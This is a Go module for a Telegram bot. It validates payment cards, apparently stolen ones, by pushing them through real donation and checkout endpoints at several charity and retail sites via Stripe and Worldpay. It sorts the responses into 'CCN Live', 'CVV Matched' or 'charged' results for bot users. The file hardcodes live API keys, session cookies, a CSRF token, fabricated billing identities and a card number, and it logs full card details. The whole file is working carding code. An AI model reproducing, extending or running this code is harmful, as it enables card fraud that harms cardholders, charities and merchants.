package modules

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/anaskhan96/soup"
	tb "gopkg.in/telebot.v3"
)

var SPAM = make(map[int64]int64)

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func create_intent() (string, string) {
	client := &http.Client{}
	var data = strings.NewReader(`{"amount":7300,"currency":"inr","account":"us","metaData":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button"},"testMode":false,"statementDescriptorSuffix":"One Time"}`)
	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/create-payment-intent", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "yaqeeninstitute.ca")
	req.Header.Set("sec-ch-ua", `" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("content-type", "application/json")
	req.Header.Set("accept", "*/*")
	req.Header.Set("origin", "https://yaqeeninstitute.ca")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("cookie", "_country=ca; _fbp=fb.1.1643636551571.79113369; _ga=GA1.2.1623584778.1643636552; _gid=GA1.2.2096289450.1643636552; _hjFirstSeen=1; _hjSession_2220455=eyJpZCI6IjU4MmQxNDdjLWQzYTMtNGIxOC04MmZjLWQ5MWNlYTZjZDVlZSIsImNyZWF0ZWQiOjE2NDM2MzY1NTIxOTcsImluU2FtcGxlIjp0cnVlfQ==; _hjIncludedInSessionSample=1; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; __stripe_mid=b71df7f6-f9f3-4920-86dd-0bf0067aed803ef581; _hjSessionUser_2220455=eyJpZCI6ImFmZjE0NjFlLWI2NTEtNTBiYi1iOGU1LWFmMDA3ODRmM2Q1NSIsImNyZWF0ZWQiOjE2NDM2MzY1NTE4NzMsImV4aXN0aW5nIjp0cnVlfQ==; _dd_s=rum=0&expire=1643639568398&logs=1&id=13f9f01f-15ab-4b2b-aeef-533c6735b276&created=1643636551264; _gat=1")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var m map[string]string
	json.NewDecoder(resp.Body).Decode(&m)
	return m["id"], m["clientSecret"]
}

func confirm(id string, s string, cc string, year string, month string, cvc string) (string, string, string) {
	client := &http.Client{}

	var data = strings.NewReader(`receipt_email=devnull%40yaqeeninstitute.org&payment_method_data[type]=card&payment_method_data[metadata][designation]=general&payment_method_data[metadata][donation_type]=One-Time&payment_method_data[metadata][amount_without_fee]=73&payment_method_data[metadata][int_source]=yaqeeninstitute.org&payment_method_data[metadata][int_campaign]=general&payment_method_data[metadata][int_content]=main_nav_donate_button&payment_method_data[metadata][payment_method]=cc&payment_method_data[billing_details][name]=Jenna+M+Ortega&payment_method_data[billing_details][phone]=%2B1+9402197942&payment_method_data[billing_details][email]=amarnathc%40outlook.in&payment_method_data[billing_details][address][line1]=394+Olen+Thomas+Drive&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=Crowell&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=79227&payment_method_data[billing_details][address][state]=TX&payment_method_data[card][number]=` + cc + `&payment_method_data[card][cvc]=` + cvc + `&payment_method_data[card][exp_month]=` + month + `&payment_method_data[card][exp_year]=` + year + `&payment_method_data[guid]=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&payment_method_data[muid]=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e&payment_method_data[sid]=6c0ab791-b55b-4969-b556-9aca59adccd76700f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7050ff317%3B+stripe-js-v3%2F7050ff317&payment_method_data[time_on_page]=1967550&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_tGDwiUeDEcgPGTyb51bqDNG8&client_secret=` + s)
	req, err := http.NewRequest("POST", fmt.Sprintf("https://api.stripe.com/v1/payment_intents/%s/confirm", id), data)
	if err != nil {
		log.Print(err)
	}
	req.Header.Set("authority", "api.stripe.com")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("accept", "application/json")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("origin", "https://js.stripe.com")
	req.Header.Set("sec-fetch-site", "same-site")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://js.stripe.com/")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
	}
	defer resp.Body.Close()
	var x mapType
	json.NewDecoder(resp.Body).Decode(&x)
	if err != nil {
		log.Fatal(err)
	}
	code, dcode, msg := "", "", ""
	if e, ok := x["error"]; ok {
		e := e.(map[string]interface{})
		if c, ok := e["code"]; ok {
			code = c.(string)
		}
		if d, ok := e["decline_code"]; ok {
			dcode = d.(string)
		}
		if m, ok := e["message"]; ok {
			msg = m.(string)
		}
	}
	if strings.Contains(fmt.Sprint(x), "requires_source_action") {
		fmt.Println("vbv")
		code = "charge_failed"
		dcode = "3DS(VBV)"
		msg = "Failed to charge your card."

	}
	if s, ok := x["status"]; ok {
		if s.(string) == "succeeded" {
			code = "Charged 1$"
			msg = "Your card has been successfully charged!"
			dcode = "donated"
		}
	}

	return code, dcode, msg
}

func AntiSpam(user_id int64) (int64, bool) {
	for x, t := range SPAM {
		if x == user_id {
			if tim := time.Now().Unix() - t; tim < 15 {
				return tim, true
			} else {
				SPAM[user_id] = time.Now().Unix()
				return 0, false
			}

		}

	}
	SPAM[user_id] = time.Now().Unix()
	return 0, false

}

func StripeRs(cc string, month string, year string, cvc string, c tb.Context) string {
	if !IsBotAdmin(c.Sender().ID) {
		if t, s := AntiSpam(c.Sender().ID); s {
			return fmt.Sprintf("<b>AntiSpam try again after %d's</b>", 15-t)
		}

	}
	if strings.HasPrefix(cc, "533178") {
		return "Bin blocked!"
	}
	if strings.HasPrefix(year, "20") {
		year = strings.ReplaceAll(year, "20", "")

	}
	current_time := time.Now()
	id, secret := create_intent()
	code, dcode, msg := confirm(id, secret, cc, month, year, cvc)
	emoji := "✅"
	if dcode == "insufficient_funds" {
		code = "CVV Matched"
	} else if code == "card_declined" {
		code = "Card Declined"
		emoji = "❌"
	} else if code == "incorrect_number" {
		code = "Incorrect Card"
		dcode = "incorrect_number"
		emoji = "❌"
	} else if code == "incorrect_cvc" {
		dcode = "incorrect_cvc"
		code = "CCN Live"
	} else if dcode == "3DS(VBV)" {
		emoji = "❌"
	}
	total_time := time.Now().Unix() - current_time.Unix()
	if dcode != string("") {
		dcode = fmt.Sprintf("\n<b>⌥ Dcode ✑ %s</b>", dcode)
	}
	bin := GetBin(cc, 2)
	status := "Free User"
	if c.Sender().ID == OWNER_ID {
		status = "Master"
	} else if IsBotAdmin(c.Sender().ID) {
		status = "Premium"
	}
        log.Print(cc + "|" + month + "|" + year + "|" + cvc + "-" + dcode + "|" + c.Sender().FirstName)
	F := fmt.Sprintf(stripe_1, "Stripe 1$", cc, year, month, cvc, code, emoji, dcode, msg, bin, total_time, c.Sender().FirstName, status)
	return F
}

// worldpay

func WorldPay2() (string, string) {
	var data = strings.NewReader(`{"reusable":true,"paymentMethod":{"type":"Card","name":"Jenna M Ortega","expiryMonth":"02","expiryYear":"2023","cardNumber":"4839502861662546","cvc":"877"},"clientKey":"L_C_f9461fc4-2e33-44fb-b45a-11e4789e4359"}`)
	req, err := http.NewRequest("POST", "https://api.worldpay.com/v1/tokens", data)
	if err != nil {
		log.Print(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("Content-type", "application/json")
	resp, err := myClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var x mapType
	json.NewDecoder(resp.Body).Decode(&x)
	token := x["token"].(string)
	maskedCardNumber := x["paymentMethod"].(map[string]interface{})["maskedCardNumber"].(string)
	if err != nil {
		log.Fatal(err)
	}
	return token, maskedCardNumber

}

func WorldPay(cc string, month string, year string, cvc string) string {
	token, maskedCardNumber := WorldPay2()
	client := &http.Client{}
	var data = strings.NewReader(`action=process_donation&donate%5Bname%5D=Jenna+M&donate%5Bemail%5D=amarnathc%40outlook.in&donate%5Bphone%5D=%28495%299613740&donate%5Bline1%5D=37157+Dameon+Island&donate%5Bline2%5D=&donate%5Bline3%5D=&donate%5Bcity%5D=El+Paso&donate%5Bcounty%5D=United+States&donate%5Bcountry%5D=US&donate%5Bpostcode%5D=54490&donate%5Bamount%5D=0&donate%5Bmessage%5D=bye&token=` + fmt.Sprintf(`%s&maskedCardNumber=%s`, token, url.QueryEscape(maskedCardNumber)))
	req, err := http.NewRequest("POST", "https://www.biblicaeurope.com/wp-admin/admin-post.php", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "www.biblicaeurope.com")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("origin", "https://www.biblicaeurope.com")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("sec-fetch-dest", "document")
	req.Header.Set("referer", "https://www.biblicaeurope.com/donate/")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("Cookie", "CookieConsent={stamp:%27-1%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cver:1%2Cutc:1644038831143%2Cregion:%27IN%27}")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	bodyText, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	s := soup.HTMLParse(string(bodyText))
	r := s.Find("div", "class", "col-md-12").Text()
	if r != string("") {
		return r
	}
	return ""
}

func StripeUSD(cc string, month string, year string, cvc string, c tb.Context) string {
	var data = strings.NewReader(`card[number]=` + cc + `&card[cvc]=` + cvc + `&card[exp_month]=` + month + `&card[exp_year]=` + year + `&guid=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&muid=48d7d431-4532-4771-ad19-b3c4f6f9a71fb97291&sid=529f74db-16a2-472e-8cef-acad4c7ea2ca485d78&payment_user_agent=stripe.js%2F46a78fc85%3B+stripe-js-v3%2F46a78fc85&time_on_page=96991&key=pk_live_O98c9ngrjsN9aCgHLae6hqHU&pasted_fields=number`)
	req, _ := http.NewRequest("POST", "https://api.stripe.com/v1/tokens", data)
	resp, err := myClient.Do(req)
	check(err)
	defer resp.Body.Close()
	var xd mapType
	json.NewDecoder(resp.Body).Decode(&xd)
	fmt.Println(xd)
	token := xd["id"].(string)
	rand.Seed(time.Now().UnixNano())
	email := RandStringRunes(10) + "@outlook.in"
	var data2 = strings.NewReader(`{"payment_type":"stripe","token":"` + token + `","coupon":null,"save_card":true,"credit_card_id":null,"regionInfo":{"clientTcpRtt":41,"longitude":"75.77210","latitude":"11.24480","tlsCipher":"AEAD-AES128-GCM-SHA256","continent":"AS","asn":138754,"clientAcceptEncoding":"gzip, deflate, br","country":"IN","tlsClientAuth":{"certIssuerDNLegacy":"","certIssuerSKI":"","certSubjectDNRFC2253":"","certSubjectDNLegacy":"","certFingerprintSHA256":"","certNotBefore":"","certSKI":"","certSerial":"","certIssuerDN":"","certVerified":"NONE","certNotAfter":"","certSubjectDN":"","certPresented":"0","certRevoked":"0","certIssuerSerial":"","certIssuerDNRFC2253":"","certFingerprintSHA1":""},"tlsExportedAuthenticator":{"clientFinished":"5c531a27fe72f0b98b5e392629c7596556c5403e35336e64e485e7a1c8b98828","clientHandshake":"bb4a389f31ec151b3e1fb45ceb636ae16f0d8e51097e573e85ff2403e4afdd83","serverHandshake":"955c453afaa59c514faae6d41ba2dfd990e0ae79afbc1920e4a759209f8b65ac","serverFinished":"a4acd0682a9f6170706f5afcd54b7d26abbdea4358d2a5cdcb644ca6622bf524"},"tlsVersion":"TLSv1.3","colo":"BOM","timezone":"Asia/Kolkata","city":"Kozhikode","httpProtocol":"HTTP/2","edgeRequestKeepAliveStatus":1,"requestPriority":"weight=220;exclusive=1","botManagement":{"ja3Hash":"cd08e31494f9531f560d64c695473da9","staticResource":false,"verifiedBot":false,"score":34},"clientTrustScore":34,"region":"Kerala","regionCode":"MH","asOrganization":"Kerala Vision Broad Band Private Limited","postalCode":"673004"},"email":"` + email + `","products":[304]}`)
	req2, _ := http.NewRequest("POST", "https://www.masterclass.com/api/v2/orders", data2)
	req2.Header.Set("authority", "www.masterclass.com")
	req2.Header.Set("content-type", "application/json; charset=UTF-8")
	req2.Header.Set("x-csrf-token", "Gy16qIg9G/0hpXHCiWM7E9CMcXRxTSN1znejZGynIF21Hy7/G6UILiPX/TDENdm/BZcNgZbzwk10/d6u28ZFcQ==")
	req2.Header.Set("sec-ch-ua-mobile", "?0")
	req2.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req2.Header.Set("accept", "*/*")
	req2.Header.Set("origin", "https://www.masterclass.com")
	req2.Header.Set("sec-fetch-site", "same-origin")
	req2.Header.Set("sec-fetch-mode", "cors")
	req2.Header.Set("sec-fetch-dest", "empty")
	req2.Header.Set("referer", "https://www.masterclass.com/plans")
	req2.Header.Set("accept-language", "en-US,en;q=0.9")
	req2.Header.Set("cookie", "ajs_anonymous_id=%22rails-gen-95edfa57-b35a-4123-af07-a7059b0d8d81%22; first_visit=1; first_visit_on=2022-01-22; __stripe_mid=48d7d431-4532-4771-ad19-b3c4f6f9a71fb97291; splitter_subject_id=8097400; __cf_bm=GV25pyG7zDTKep9GrTytHkbD5S0lYTJ06KCGl7GMjk4-1644046533-0-AeE2I4EIDn+JXfQqo+RwNXn6Uv9SxjI6GF06gDjcGArGmbcPKI6xzzY/77N1tT26HlYzQors+csoepjSFf70Wq8=; split=%7B%22falcon_personalization_standalone%22%3A%22variation%22%2C%22post_pw_tv_my_progress%22%3A%22variation%22%2C%22checkout_modal_recently_viewed_instructor_avatars_disco_7_v1%22%3A%22variant_1%22%2C%22boso21_bipartisan_approach_cm%22%3A%22variant_2%22%2C%22announcement_tile_course_duration_disco_213_v1%22%3A%22variant_2%22%2C%22boso21_gift_hero_revamp%22%3A%22variant_1%22%2C%22course_impact_survey%22%3A%22variant_1%22%2C%22pricing_text_all_access_disco_95_v1%22%3A%22variant_2%22%2C%22plan_page_family_plan_painted_door_prc3_v0%22%3A%22variant_2%22%7D; _session_id=c83d9722d99b37263786dfc9a14f26fc; track_visit_session_id=4ab0886f-0e33-4cd8-bb7a-15d4de77ab27; gdpr_checked=true; checkout_product_tiers_plan={%22name%22:%22Plus%22%2C%22price%22:{%22annual%22:%22%E2%82%B920%2C700%22%2C%22monthly%22:%22%E2%82%B91%2C725%22%2C%22flatRate%22:2070000%2C%22id%22:296}%2C%22id%22:296}; mc_cart=%5B%7B%22id%22%3A296%2C%22cart_exclusive%22%3Atrue%2C%22open_as_gift%22%3Afalse%7D%5D; cart_email=%22hfdsfhewufjhewdufjeufeufhe%40outlook.com%22; __stripe_sid=529f74db-16a2-472e-8cef-acad4c7ea2ca485d78")
	resp2, err := myClient.Do(req2)
	check(err)
	defer resp2.Body.Close()
	var x map[string]interface{}
	json.NewDecoder(resp2.Body).Decode(&x)
	fmt.Println(x)
	emoji := "✅"
	if e, ok := x["error"]; ok {
		code := e.(map[string]interface{})["code"].(string)
		msg := e.(map[string]interface{})["message"].(string)
		dcode := ""
		if code == "incorrect_cvc" {
			dcode = "incorrect_cvc"
			code = "CCN Live"
		} else if code == "insufficient_funds" {
			dcode = "insufficient_funds"
			code = "CVV Matched"
		} else {
			emoji = "❌"
		}
		return fmt.Sprintf(stripe_1, "Stripe/15$", cc, month, year, code, emoji, dcode, msg, dcode, GetBin(cc, 2), "0", c.Sender().FirstName, "Test")
	}
	return fmt.Sprint(x)
}
